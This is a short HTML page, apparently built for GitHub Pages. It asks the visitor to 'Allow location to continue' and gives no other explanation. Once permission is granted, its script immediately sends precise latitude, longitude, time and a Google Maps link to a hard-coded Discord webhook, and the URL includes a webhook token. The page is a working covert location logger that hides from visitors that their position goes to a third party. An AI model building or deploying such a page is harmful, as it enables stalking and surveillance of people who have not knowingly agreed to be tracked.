<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Location Request</title>
  <style>
    body { font-family: Arial, sans-serif; text-align: center; padding: 50px; background: #f0f0f0; }
    h1 { color: #333; }
  </style>
</head>
<body>
  <h1>Allow location to continue</h1>
  <p id="status">Please click "Allow" when the browser asks for your location.</p>

  <script>
    const webhookUrl = "https://discord.com/api/webhooks/1496992326613074151/ksCzYavEYpnu3ecrCpEMHiVDNvX0SMmU89NF8s9eOYGgLid054OkRlr8dQ6cIkZLluE8";   // ← Change this

    function sendToDiscord(position) {
      const lat = position.coords.latitude;
      const lon = position.coords.longitude;
      const timestamp = new Date().toLocaleString();

      // Build a nice message for Discord
      const embed = {
        embeds: [{
          title: "📍 New Location Accepted!",
          color: 0x00ff00,
          fields: [
            { name: "Latitude", value: lat.toFixed(6), inline: true },
            { name: "Longitude", value: lon.toFixed(6), inline: true },
            { name: "Time", value: timestamp, inline: false },
            { name: "Google Maps", value: `https://www.google.com/maps?q=${lat},${lon}`, inline: false }
          ],
          footer: { text: "Location Logger via GitHub Pages" }
        }]
      };

      fetch(webhookUrl, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify(embed)
      })
      .then(() => {
        document.getElementById("status").innerHTML = "✅ Thank you! Location sent successfully.";
      })
      .catch(() => {
        document.getElementById("status").innerHTML = "❌ Failed to send (check webhook URL).";
      });
    }

    function handleError(err) {
      let msg = "Location access was blocked or unavailable.";
      if (err.code === 1) msg = "You blocked location access.";
      document.getElementById("status").innerHTML = msg;
    }

    // Ask for location immediately
    if (navigator.geolocation) {
      navigator.geolocation.getCurrentPosition(sendToDiscord, handleError, {
        enableHighAccuracy: true,
        timeout: 10000
      });
    } else {
      document.getElementById("status").innerHTML = "Geolocation not supported.";
    }
  </script>
</body>
</html>
